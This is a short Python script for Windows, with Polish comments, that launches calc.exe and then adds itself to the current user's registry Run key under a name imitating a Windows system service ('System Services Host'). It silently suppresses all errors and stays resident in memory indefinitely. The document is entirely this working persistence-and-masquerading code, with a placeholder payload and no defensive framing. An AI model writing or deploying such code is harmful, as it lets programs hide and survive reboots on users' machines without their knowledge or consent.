import os
import subprocess
import winreg
import threading

# --- SEKCJA KONFIGURACJI ---
NAZWA_W_AUTOSTARCIE = "HostUslugSystemowych"
KLUCZ_REJESTRU = r"Software\Microsoft\Windows\CurrentVersion\Run"


# --- TO WYKONUJE SIĘ DOKŁADNIE RAZ PO URUCHOMIENIU ---

# 1. Uruchomienie kalkulatora
try:
    subprocess.Popen("calc.exe", creationflags=0x00000008, close_fds=True)
except Exception:
    pass

# 2. Dodanie do autostartu
try:
    # Pobieramy komendę, którą Twój launcher został uruchomiony, 
    # aby system wiedział, co dokładnie ma włączyć przy starcie
    import sys
    komenda_startowa = f'"{sys.executable}"'
    if len(sys.argv) > 1:
        komenda_startowa += " " + " ".join(f'"{arg}"' for arg in sys.argv[1:])

    klucz = winreg.OpenKey(winreg.HKEY_CURRENT_USER, KLUCZ_REJESTRU, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(klucz, NAZWA_W_AUTOSTARCIE, 0, winreg.REG_SZ, komenda_startowa)
    winreg.CloseKey(klucz)
except Exception:
    pass


# --- BLOKADA PROCESU (ZAMIAST PĘTLI) ---
# Kod wykonał zadania wyżej i dochodzi tutaj. 
# Zatrzymuje się w pamięci na stałe, nie zużywając procesora i nie zamykając programu.

stop_event = threading.Event()
stop_event.wait()
